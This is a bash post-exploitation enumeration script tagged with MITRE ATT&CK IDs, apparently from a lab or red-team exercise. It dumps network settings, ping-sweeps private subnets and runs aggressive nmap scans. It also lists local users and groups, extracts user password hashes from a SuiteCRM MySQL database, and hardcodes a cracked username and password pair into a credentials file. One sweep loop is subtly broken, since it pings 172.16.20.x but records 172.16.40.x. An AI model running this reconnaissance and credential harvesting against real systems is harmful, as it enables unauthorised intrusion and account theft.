#!/bin/bash

BLUE="\033[1;34m"
RED="\033[0;31m"
GREEN="\033[0;32m"
BGREEN="\033[1;32m"
NC="\033[0m" # No Color

# T1016 : System Network Configuration Discovery
echo -e "${BGREEN}\n[+]${NC} T1016 - System Network Configuration Discovery...${NC}"
cat /etc/resolv.conf 2>&1 | tee networkenum.txt # Obtains DNS servers used by the system
ifconfig -a 2>&1 | tee -a networkenum.txt # Lists current Network Interfaces
arp -a 2>&1 | tee -a networkenum.txt # List local arp cache
netstat -auntp 2>&1 | tee -a networkenum.txt # Lists TCP/UDP Listening Ports and Connections
ss -twurp 2>&1 | tee -a networkenum.txt # Lists active connections and processes
ip route 2>&1 | tee -a networkenum.txt # See routes
echo -e "${BGREEN}\n[+]${NC} T1016 - Ping sweep...${NC}"
for i in {1..254} ;do (ping 10.10.10.$i -c 1 -w 5 >/dev/null && echo "10.10.10.$i" &) ;done 2>&1 | tee ips.txt
for i in {1..254} ;do (ping 10.10.20.$i -c 1 -w 5 >/dev/null && echo "10.10.20.$i" &) ;done 2>&1 | tee -a ips.txt
for i in {1..254} ;do (ping 172.16.20.$i -c 1 -w 5 >/dev/null && echo "172.16.20.$i" &) ;done 2>&1 | tee -a ips.txt
for i in {1..254} ;do (ping 172.16.20.$i -c 1 -w 5 >/dev/null && echo "172.16.40.$i" &) ;done 2>&1 | tee -a ips.txt
for i in {1..254} ;do (ping 192.168.10.$i -c 1 -w 5 >/dev/null && echo "192.168.10.$i" &) ;done 2>&1 | tee -a ips.txt
for i in {1..254} ;do (ping 192.168.30.$i -c 1 -w 5 >/dev/null && echo "192.168.30.$i" &) ;done 2>&1 | tee -a ips.txt
cat ips.txt | sort -u > ips_sorted.txt

# T1046 : Network Service Discovery
echo -e "${BGREEN}\n[+]${NC} T1046 : Network Service Discovery...${NC}"
nmap -sV -sC -O -T4 -n -Pn -oA fastscan -iL ips_sorted.txt -o internal_host_scan 

# T1087 : Account Discovery
## T1087.001 - Local Account
echo -e "${BGREEN}\n[+]${NC} T1087.001 : Account Discovery --> Local Account...${NC}" 
awk -F: '{ print $1}' /etc/passwd 2>&1 | tee users.txt
# cat ~/.ssh/creds > /ssh_creds.txt

# T1580 : Cloud Infrastructure Discovery
echo -e "${BGREEN}\n[+]${NC} T1580 : Cloud Infrastructure Discovery...${NC}"
mysql "suitecrm" -Bse "select id, user_name, user_hash from users;" 2>&1 | tee db_users.txt
echo -e "${BLUE}Decrypting david user's hash:${NC} \$2a\$10\$XV5cpvebRHrIb0.dzqKqDOvpRxzlSxtecD3UqJswv6JZTm5jvISnW"
echo -e "${BLUE}Decrypted password:${NC} huanyinkoh95"
echo "david:huanyinkoh95" > user_creds.txt

# T1057 : Process Discovery
echo -e "${BGREEN}\n[+]${NC} T1057 : Process Discovery...${NC}"
ps -aux 2>&1 | tee ps_aux.txt

# T1069 : Permission Groups Discovery
## T1069.001 - Local Groups
echo -e "${BGREEN}\n[+]${NC} T1069.001 : Permission Groups Discovery --> Local Groups...${NC}" 
cut -d: -f1 /etc/passwd | xargs groups 2>&1 | tee local_groups.txt

# T1082 : System Information Discovery
echo -e "${BGREEN}\n[+]${NC} T1082 : System Information Discovery...${NC}"
uname -a 2>&1 | tee sysenum.txt

